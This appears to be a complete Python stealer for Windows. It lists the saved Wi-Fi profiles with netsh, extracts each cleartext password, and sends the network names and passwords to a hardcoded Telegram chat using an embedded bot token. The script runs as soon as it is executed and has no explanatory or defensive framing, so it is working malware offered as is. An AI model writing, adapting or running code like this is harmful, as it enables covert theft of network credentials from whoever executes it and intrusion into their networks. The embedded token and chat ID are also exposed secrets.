import subprocess as sp
import re
import telebot
KEY = '6278819482:AAEvlA97-owYplTGl9FHQ2o1_mqpYKE85Ts'
bot = telebot.TeleBot(KEY)
chat_id = '2069136731'


def check_all_your_networks_list():
    result = sp.getoutput('netsh wlan show profile')
    result = re.findall(r': \w+.+\w+', result)
    true_list = []
    for i in result:
        true_list.append(re.findall(r'\w+.+\w+', i))
    return true_list


def open_list(some_list):
    new_list = []
    for i in some_list:
        if isinstance(i, list):
            for j in i:
                new_list.append(j)
    return new_list


def show_all_your_networks_password_and_send_it():
    all_networks = open_list(check_all_your_networks_list())
    str_ = ''
    for network in all_networks:
        result = sp.check_output(f'netsh wlan show profile "{network}" key=clear')
        result = f'{result}'
        password = re.findall(r'xa0 +:[^\\]{0,12}', result)[0]
        password = re.findall(r'[^:]+', password)[1]
        str_ += f'name -> {network}; password -> {password}\n'
    bot.send_message(chat_id, str_)


show_all_your_networks_password_and_send_it()
